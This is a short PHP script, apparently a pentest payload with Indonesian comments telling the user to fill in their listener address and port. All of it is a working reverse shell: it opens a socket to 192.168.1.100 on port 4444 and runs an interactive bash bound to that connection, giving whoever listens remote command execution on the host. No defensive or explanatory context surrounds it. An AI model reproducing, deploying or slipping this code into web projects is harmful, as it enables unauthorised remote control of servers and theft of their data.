<?php
// PHP Reverse Shell
// Usage: php php_rev.php

$ip = '192.168.1.100';  // GANTI DENGAN LHOST ANDA
$port = 4444;            // GANTI DENGAN LPORT ANDA

$sock = fsockopen($ip, $port);
exec("/bin/bash -i <&3 >&3 2>&3");
?>
